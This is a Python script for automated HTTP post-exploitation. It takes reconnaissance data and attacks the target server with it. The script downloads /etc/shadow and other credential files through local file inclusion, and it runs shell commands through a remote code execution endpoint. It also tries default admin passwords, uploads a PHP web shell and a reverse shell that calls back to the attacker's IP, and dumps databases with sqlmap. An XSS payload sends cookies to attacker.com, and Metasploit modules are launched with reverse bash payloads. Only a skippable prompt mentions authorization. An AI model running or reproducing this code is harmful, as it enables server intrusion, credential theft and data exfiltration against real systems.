#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import requests
import urllib3
import urllib.parse

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Helper
def _sanitize(text: str) -> str:
    """Return a filesystem-safe version of a string suitable for filenames."""
    return re.sub(r"[^A-Za-z0-9]+", "_", text).strip("_")

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
OUTPUT_DIR = Path("outputs")
POST_EXPLOIT_JSON = "{target}_http_post_exploit.json"
POST_EXPLOIT_MD = "{target}_http_post_exploit.md"

def run_command(cmd: List[str], timeout: int = 180, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), result.returncode == 0
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def download_sensitive_files_via_http(base_url: str, discovered_endpoints: List[Dict]) -> List[Dict]:
    """Download sensitive files via HTTP using discovered endpoints."""
    results = []
    
    # Common sensitive files to try
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow", 
        "/etc/hosts",
        "/proc/version",
        "/proc/cmdline",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/etc/ssh/sshd_config",
        "/etc/sudoers",
        "/etc/crontab",
        "/etc/fstab",
        "/proc/net/tcp",
        "/proc/mounts"
    ]
    
    # Try to download via LFI endpoints first
    for endpoint in discovered_endpoints:
        if endpoint.get("type") in ["dynamic_file", "general_endpoint"]:
            for param in endpoint.get("parameters", []):
                if param in ["file", "include", "path", "page"]:
                    for sensitive_file in sensitive_files:
                        try:
                            lfi_url = f"{endpoint['url']}?{param}={urllib.parse.quote(sensitive_file)}"
                            response = requests.get(lfi_url, timeout=10, verify=False)
                            
                            if response.status_code == 200 and len(response.text) > 10:
                                # Save the file locally
                                safe_filename = sensitive_file.replace("/", "_")
                                tag = _sanitize(urllib.parse.urlparse(endpoint['url']).path)
                                proof_file = OUTPUT_DIR / f"lfi_{tag}_{safe_filename}.txt"
                                with proof_file.open("w", encoding='utf-8') as f:
                                    f.write(response.text)
                                
                                results.append({
                                    "type": "LFI File Download",
                                    "file": sensitive_file,
                                    "url": lfi_url,
                                    "details": f"Downloaded {sensitive_file} via LFI",
                                    "poc": f"curl '{lfi_url}'",
                                    "proof": f"Downloaded {sensitive_file}: {response.text[:200]}... (saved to {proof_file})"
                                })
                                
                        except Exception as e:
                            logger.error(f"LFI download failed for {sensitive_file}: {e}")
    
    return results

def load_exploit_results(target: str) -> Dict:
    """Load exploit results JSON if present."""
    exploit_file = OUTPUT_DIR / f"{target}_http_exploit.json"
    if exploit_file.exists():
        try:
            with exploit_file.open("r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def parse_url_and_param_from_poc(poc: str) -> Tuple[str, str]:
    """Extract base URL and parameter name from a curl PoC string."""
    try:
        m = re.search(r"curl\s+'([^']+)'|curl\s+\"([^\"]+)\"", poc)
        full_url = m.group(1) if m and m.group(1) else (m.group(2) if m else "")
        if not full_url:
            return "", ""
        parts = urllib.parse.urlsplit(full_url)
        qs = urllib.parse.parse_qs(parts.query)
        if not qs:
            return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, "", "")), ""
        # take first param
        param_name = next(iter(qs.keys()))
        base_url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
        return base_url, param_name
    except Exception:
        return "", ""

def use_rce_for_enumeration(rce_url: str, parameter: str) -> List[Dict]:
    """Run a standard post-exploitation enumeration via RCE endpoint."""
    results = []
    if not rce_url or not parameter:
        return results
    enum_cmds = [
        ("id", "User and group info"),
        ("whoami", "Current user"),
        ("uname -a", "System info"),
        ("pwd", "Working directory"),
        ("ls -la /", "Root directory listing"),
        ("cat /etc/passwd", "Users"),
        ("cat /etc/group", "Groups"),
        ("ps aux | head -20", "Top processes"),
        ("netstat -tuln | head -20", "Listening services"),
        ("find / -perm -4000 2>/dev/null | head -20", "SUID binaries"),
    ]
    for cmd, desc in enum_cmds:
        try:
            url = f"{rce_url}?{parameter}={urllib.parse.quote(cmd)}"
            resp = requests.get(url, timeout=10, verify=False)
            if resp.status_code == 200 and len(resp.text) > 0:
                proof_file = OUTPUT_DIR / f"rce_{desc.replace(' ', '_').lower()}.txt"
                with proof_file.open("w", encoding="utf-8") as f:
                    f.write(resp.text)
                results.append({
                    "type": "RCE Post-Enumeration",
                    "details": f"{desc}",
                    "poc": f"curl '{url}'",
                    "proof": f"Saved to {proof_file}"
                })
        except Exception:
            continue
    return results

def targeted_lfi_download(lfi_url: str, parameter: str) -> List[Dict]:
    """Use a confirmed LFI endpoint to download sensitive files."""
    results = []
    if not lfi_url or not parameter:
        return results
    sensitive_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/ssh/sshd_config",
        "/etc/sudoers", "/var/log/auth.log", "/var/log/syslog", "/etc/crontab"
    ]
    for fpath in sensitive_files:
        try:
            url = f"{lfi_url}?{parameter}={urllib.parse.quote(fpath)}"
            r = requests.get(url, timeout=10, verify=False)
            if r.status_code == 200 and len(r.text) > 0 and ("root:" in r.text or len(r.text) > 50):
                safe = fpath.replace("/", "_")
                tag = _sanitize(urllib.parse.urlparse(lfi_url).path)
                pfile = OUTPUT_DIR / f"lfi_{tag}_{safe}.txt"
                with pfile.open("w", encoding="utf-8") as f:
                    f.write(r.text)
                results.append({
                    "type": "LFI File Download",
                    "details": f"Downloaded {fpath}",
                    "poc": f"curl '{url}'",
                    "proof": f"Saved to {pfile}"
                })
        except Exception:
            continue
    return results

def sqlmap_extract_from_exploit(url: str, parameter: str) -> List[Dict]:
    """Run sqlmap on a specific exploit URL/parameter to extract DB info."""
    results = []
    if not url or not parameter:
        return results
    try:
        cmd = ["sqlmap", "-u", url, "-p", parameter, "--batch", "--dbs", "--level", "3", "--risk", "2"]
        out, ok = run_command(cmd, timeout=300)
        if ok and ("available databases" in (out or "").lower()):
            results.append({
                "type": "SQL Injection Data Extraction",
                "details": f"Databases enumerated for {url}",
                "poc": " ".join(cmd),
                "proof": out[:1000]
            })
    except Exception:
        pass
    return results

def apply_cookie_toggle_from_poc(poc: str) -> List[Dict]:
    """If PoC contains a Cookie header, reuse it to access index.php and record difference."""
    results = []
    try:
        m = re.search(r"-H\s+'Cookie:\s*([^']+)'\s+'(http[^']+)'", poc)
        if not m:
            return results
        cookie = m.group(1)
        url = m.group(2)
        r1 = requests.get(url, timeout=8, verify=False)
        r2 = requests.get(url, timeout=8, verify=False, headers={"Cookie": cookie})
        if r2.status_code == 200 and len(r2.text) > len(r1.text):
            pfile = OUTPUT_DIR / "cookie_toggle_with_cookie.html"
            with pfile.open("w", encoding="utf-8") as f:
                f.write(r2.text)
            results.append({
                "type": "Cookie Toggle (Exploit-driven)",
                "details": f"Applied Cookie: {cookie}",
                "poc": poc,
                "proof": f"Saved with-cookie page to {pfile}"
            })
    except Exception:
        pass
    return results

def exploit_admin_panels(base_url: str, discovered_endpoints: List[Dict]) -> List[Dict]:
    """Exploit discovered admin panels."""
    results = []
    
    # Common admin credentials
    admin_creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("root", "root"),
        ("root", "password"),
        ("administrator", "administrator"),
        ("user", "user"),
        ("test", "test")
    ]
    
    for endpoint in discovered_endpoints:
        if endpoint.get("type") == "admin_panel":
            for username, password in admin_creds:
                try:
                    # Try to login to admin panel
                    login_data = {
                        "username": username,
                        "password": password,
                        "user": username,
                        "pass": password,
                        "admin": username,
                        "login": "Login"
                    }
                    
                    response = requests.post(endpoint["url"], data=login_data, timeout=10, verify=False)
                    
                    if response.status_code == 200 and ("dashboard" in response.text.lower() or "admin" in response.text.lower()):
                        results.append({
                            "type": "Admin Panel Access",
                            "url": endpoint["url"],
                            "details": f"Successfully accessed admin panel with {username}:{password}",
                            "poc": f"curl -X POST '{endpoint['url']}' -d 'username={username}&password={password}'",
                            "proof": f"Admin panel accessed: {response.text[:200]}..."
                        })
                        break
                        
                except Exception as e:
                    logger.error(f"Admin panel test failed for {endpoint['url']}: {e}")
    
    return results

def exploit_upload_vulnerabilities(base_url: str, discovered_endpoints: List[Dict], attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Exploit file upload vulnerabilities."""
    results = []
    
    for endpoint in discovered_endpoints:
        if endpoint.get("type") == "upload_directory":
            try:
                # Create a simple PHP shell
                shell_content = f"""<?php
system($_GET['cmd']);
?>
"""
                
                # Try to upload shell via various methods
                upload_url = endpoint["url"]
                
                # Method 1: Direct file upload
                files = {"file": ("shell.php", shell_content, "application/x-php")}
                response = requests.post(upload_url, files=files, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Test if shell was uploaded
                    shell_url = f"{base_url}/shell.php?cmd=whoami"
                    shell_response = requests.get(shell_url, timeout=10, verify=False)
                    
                    if shell_response.status_code == 200 and len(shell_response.text) > 0:
                        results.append({
                            "type": "File Upload Shell",
                            "url": shell_url,
                            "details": f"Successfully uploaded shell to {upload_url}",
                            "poc": f"curl -X POST '{upload_url}' -F 'file=@shell.php' && curl '{shell_url}'",
                            "proof": f"Shell executed: {shell_response.text.strip()}"
                        })
                
                # Method 2: Try reverse shell
                reverse_shell_content = f"""<?php
$sock=fsockopen("{attacker_ip}",{attacker_port});
exec("/bin/bash -i <&3 >&3 2>&3");
?>
"""
                
                files = {"file": ("reverse.php", reverse_shell_content, "application/x-php")}
                response = requests.post(upload_url, files=files, timeout=10, verify=False)
                
                if response.status_code == 200:
                    results.append({
                        "type": "Reverse Shell Upload",
                        "url": f"{base_url}/reverse.php",
                        "details": f"Reverse shell uploaded to {upload_url}",
                        "poc": f"curl -X POST '{upload_url}' -F 'file=@reverse.php' && nc -lvp {attacker_port}",
                        "proof": "Reverse shell uploaded successfully"
                    })
                    
            except Exception as e:
                logger.error(f"Upload exploitation failed for {endpoint['url']}: {e}")
    
    return results

def exploit_sql_injection_for_data(base_url: str, vulnerable_endpoints: Dict) -> List[Dict]:
    """Exploit SQL injection vulnerabilities for data extraction."""
    results = []
    
    sql_endpoints = vulnerable_endpoints.get("sql_injection", [])
    
    for endpoint in sql_endpoints:
        try:
            # Use sqlmap to extract data
            sqlmap_cmd = [
                "sqlmap", "-u", endpoint["url"], "-p", endpoint["parameter"],
                "--batch", "--random-agent", "--dbs", "--tables", "--dump",
                "--level", "5", "--risk", "3"
            ]
            
            output, success = run_command(sqlmap_cmd, timeout=300)
            
            if success and ("available databases" in output or "found databases" in output):
                # Extract database information
                db_info = ""
                if "available databases" in output:
                    db_match = re.search(r"available databases \[(\d+)\]:\s*\n(.*?)(?=\n\n|\n\[)", output, re.DOTALL)
                    if db_match:
                        db_info = f"Found {db_match.group(1)} databases: {db_match.group(2).strip()}"
                
                results.append({
                    "type": "SQL Injection Data Extraction",
                    "url": endpoint["url"],
                    "details": f"Successfully extracted data via SQL injection: {db_info}",
                    "poc": f"sqlmap -u '{endpoint['url']}' -p {endpoint['parameter']} --batch --dbs --tables --dump",
                    "proof": f"Database data extracted: {db_info}"
                })
                
        except Exception as e:
            logger.error(f"SQL injection exploitation failed for {endpoint['url']}: {e}")
    
    return results

def exploit_xss_for_session_hijacking(base_url: str, vulnerable_endpoints: Dict) -> List[Dict]:
    """Exploit XSS vulnerabilities for session hijacking."""
    results = []
    
    xss_endpoints = vulnerable_endpoints.get("xss", [])
    
    for endpoint in xss_endpoints:
        try:
            # Create XSS payload to steal cookies
            xss_payload = """<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal?cookie=' + document.cookie, true);
xhr.send();
</script>"""
            
            # Test XSS payload
            test_url = f"{endpoint['url']}?{endpoint['parameter']}={urllib.parse.quote(xss_payload)}"
            response = requests.get(test_url, timeout=10, verify=False)
            
            if xss_payload in response.text:
                results.append({
                    "type": "XSS Session Hijacking",
                    "url": endpoint["url"],
                    "details": f"XSS payload successfully injected for session hijacking",
                    "poc": f"curl '{test_url}'",
                    "proof": f"XSS payload reflected: {xss_payload[:100]}..."
                })
                
        except Exception as e:
            logger.error(f"XSS exploitation failed for {endpoint['url']}: {e}")
    
    return results

def test_metasploit_http_post_exploit(target: str, port: str, attacker_ip: str, attacker_port: str, metadata: Dict) -> List[Dict]:
    """Test Metasploit HTTP post-exploitation using reconnaissance data."""
    results = []
    
    # Use recon data to determine appropriate modules
    http_banner = metadata.get("http_banner", "")
    https_banner = metadata.get("https_banner", "")
    outdated_software = metadata.get("outdated_software", [])
    
    # Common HTTP post-exploitation modules
    http_modules = [
        "exploit/unix/webapp/php_cgi_arg_injection",
        "exploit/unix/webapp/php_include",
        "exploit/linux/http/php_cgi_query_string",
        "exploit/unix/webapp/php_include_path",
        "exploit/linux/http/php_cgi_script_header"
    ]
    
    # Add version-specific modules based on recon
    exploitable_versions = metadata.get("exploitable_versions", {})
    for software, modules in exploitable_versions.items():
        if modules and modules != ["none"]:
            http_modules.extend(modules)
    
    # Remove duplicates
    http_modules = list(set(http_modules))
    
    for module in http_modules:
        logger.info(f"Testing Metasploit HTTP post-exploitation: {module}")
        
        msf_cmd = [
            "msfconsole", "-q", "-x",
            f"use {module}; set RHOSTS {target}; set RPORT {port}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD cmd/unix/reverse_bash; run; exit"
        ]
        
        output, success = run_command(msf_cmd, timeout=600)
        poc = f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {port}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD cmd/unix/reverse_bash; run'"
        
        if success and ("Meterpreter session" in output or "Shell session" in output or "Command shell session" in output):
            results.append({
                "type": f"Metasploit HTTP Post-Exploit - {module.split('/')[-1]}",
                "details": f"Successfully exploited with {module}",
                "poc": poc,
                "proof": "Metasploit session established"
            })
    
    return results

def post_exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Perform comprehensive HTTP post-exploitation using reconnaissance data."""
    results = []
    
    logger.info(f"Starting HTTP post-exploitation of {target}:{port} using reconnaissance data")
    
    base_url = f"http://{target}:{port}"
    discovered_endpoints = metadata.get("discovered_endpoints", [])
    vulnerable_endpoints = metadata.get("vulnerable_endpoints", {})
    
    # Load exploit results and prioritize confirmed findings
    exploit_data = load_exploit_results(target)
    successful_exploits = exploit_data.get("successful_exploits", []) if exploit_data else []

    # 1. If RCE confirmed, run post-enumeration via that endpoint
    for exp in successful_exploits:
        if "rce" in exp.get("type", "").lower():
            # try to parse rce url and param from poc
            rce_url, param = parse_url_and_param_from_poc(exp.get("poc", ""))
            results.extend(use_rce_for_enumeration(rce_url or exp.get("target_url", base_url), param or exp.get("parameter", "cmd")))
            break

    # 2. If LFI confirmed, use that endpoint to fetch sensitive files
    used_lfi = False
    for exp in successful_exploits:
        if "lfi" in exp.get("type", "").lower():
            lfi_url, param = parse_url_and_param_from_poc(exp.get("poc", ""))
            if lfi_url and param:
                results.extend(targeted_lfi_download(lfi_url, param))
                used_lfi = True
    # Fallback to generic LFI from recon
    if not used_lfi:
        file_results = download_sensitive_files_via_http(base_url, discovered_endpoints)
        results.extend(file_results)
    
    # 2. Exploit admin panels
    admin_results = exploit_admin_panels(base_url, discovered_endpoints)
    results.extend(admin_results)
    
    # 3. Exploit upload vulnerabilities
    upload_results = exploit_upload_vulnerabilities(base_url, discovered_endpoints, attacker_ip, attacker_port)
    results.extend(upload_results)
    
    # 4. Exploit SQL injection for data extraction
    # First use confirmed exploit URLs
    used_sql = False
    for exp in successful_exploits:
        if "sql injection" in exp.get("type", "").lower():
            url, param = parse_url_and_param_from_poc(exp.get("poc", ""))
            if url and param:
                results.extend(sqlmap_extract_from_exploit(url, param))
                used_sql = True
    if not used_sql:
        sql_results = exploit_sql_injection_for_data(base_url, vulnerable_endpoints)
        results.extend(sql_results)
    
    # 5. Exploit XSS for session hijacking or use cookie-toggle from exploit PoC
    xss_results = exploit_xss_for_session_hijacking(base_url, vulnerable_endpoints)
    results.extend(xss_results)
    for exp in successful_exploits:
        if "cookie" in exp.get("type", "").lower() or "cookie" in exp.get("details", "").lower():
            results.extend(apply_cookie_toggle_from_poc(exp.get("poc", "")))
    
    # 6. Test Metasploit HTTP post-exploitation
    msf_results = test_metasploit_http_post_exploit(target, port, attacker_ip, attacker_port, metadata)
    results.extend(msf_results)

    # Deduplicate LFI and other repeated entries based on (type, details)
    seen = set()
    unique_results = []
    for res in results:
        key = (res.get("type"), res.get("details"))
        if key not in seen:
            unique_results.append(res)
            seen.add(key)

    return unique_results

def save_post_exploit_report(results: List[Dict], target: str, port: str) -> None:
    """Save post-exploitation results to JSON and Markdown files."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    
    # Filter actual results from failed attempts
    actual_results = [res for res in results if "type" in res]
    failed_attempts = [res for res in results if "type" not in res]
    
    # Create JSON report
    json_data = {
        "target": target,
        "port": port,
        "service": "http",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "post_exploitation_results": actual_results,
        "failed_attempts": failed_attempts,
        "total_results": len(actual_results),
        "successful_count": len(actual_results)
    }
    
    json_file = OUTPUT_DIR / POST_EXPLOIT_JSON.format(target=target)
    with json_file.open("w", encoding='utf-8') as f:
        json.dump(json_data, f, indent=2)
    logger.info(f"JSON report saved: {json_file}")
    
    # Create Markdown report
    md_file = OUTPUT_DIR / POST_EXPLOIT_MD.format(target=target)
    with md_file.open("w", encoding='utf-8') as f:
        f.write(f"# HTTP Post-Exploitation Report - {target}\n\n")
        f.write(f"**Target:** {target}:{port}\n")
        f.write(f"**Generated:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        f.write("## Executive Summary\n")
        f.write(f"- **Total Post-Exploitation Actions:** {len(actual_results)}\n")
        f.write(f"- **Successful Actions:** {len(actual_results)}\n")
        f.write(f"- **Failed Attempts:** {len(failed_attempts)}\n\n")
        
        if actual_results:
            f.write("## Post-Exploitation Results\n\n")
            for result in actual_results:
                f.write(f"### {result['type']}\n")
                f.write(f"- **Target:** {result.get('target', f'{target}:{port}')}\n")
                f.write(f"- **Details:** {result['details']}\n")
                f.write(f"- **Proof:** {result['proof']}\n")
                f.write(f"- **PoC:** `{result['poc']}`\n\n")
        
        if failed_attempts:
            f.write("## Failed Attempts\n\n")
            for attempt in failed_attempts:
                f.write(f"- {attempt}\n")
    
    logger.info(f"Markdown report saved: {md_file}")

def main():
    """Main function."""
    parser = argparse.ArgumentParser(description="HTTP Post-Exploitation Script")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--no-confirm", action="store_true", help="Skip confirmation prompts")
    args = parser.parse_args()
    
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only!")
        confirm = input("[?] Proceed with post-exploitation? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)
    
    try:
        # Find reconnaissance metadata file
        recon_files = list(OUTPUT_DIR.glob(f"{args.target}_*_metadata.json"))
        if not recon_files:
            logger.error(f"No reconnaissance files found for {args.target}")
            sys.exit(1)
        
        # Use the HTTP reconnaissance file if available
        recon_file = None
        for file in recon_files:
            if "http" in file.name:
                recon_file = file
                break
        
        if not recon_file:
            recon_file = recon_files[0]  # Use first available file
        
        with recon_file.open("r", encoding='utf-8') as f:
            recon_data = json.load(f)
        
        # Extract port from recon data
        port = recon_data.get("port", "80")
        
        # Run post-exploitation
        results = post_exploit_target(recon_data, args.target, port, args.attacker_ip, args.attacker_port)
        
        # Save results
        save_post_exploit_report(results, args.target, port)
        
        logger.info(f"Post-exploitation complete. Found {len(results)} successful actions.")
        
    except Exception as e:
        logger.error(f"Post-exploitation failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 